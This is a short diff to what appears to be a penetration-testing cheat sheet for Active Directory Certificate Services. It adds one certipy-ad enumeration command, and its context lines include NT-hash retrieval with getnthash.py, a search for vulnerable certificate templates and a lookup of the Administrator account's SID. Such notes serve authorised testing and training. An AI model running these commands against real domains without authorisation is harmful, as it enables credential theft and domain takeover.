@@ -200,6 +200,9 @@ python3 getnthash.py -key SESSION_KEY $DOMAIN/target_user
 # Rescourse 
 certipy-ad find -u 'attacker@corp.local' -p '$PASS' -dc-ip '$DC_IP' -text -enabled -hide-admins -vulnerable
 
+# With hash
+certipy-ad find -u '$USER' -p '$PASS' -target '$DC_IP'
+
 # Requesting Administrator' SID:
 certipy-ad account read -u 'user' -p '$PASS' -dc-ip '$DC_IP' -user 'Administrator' 
 
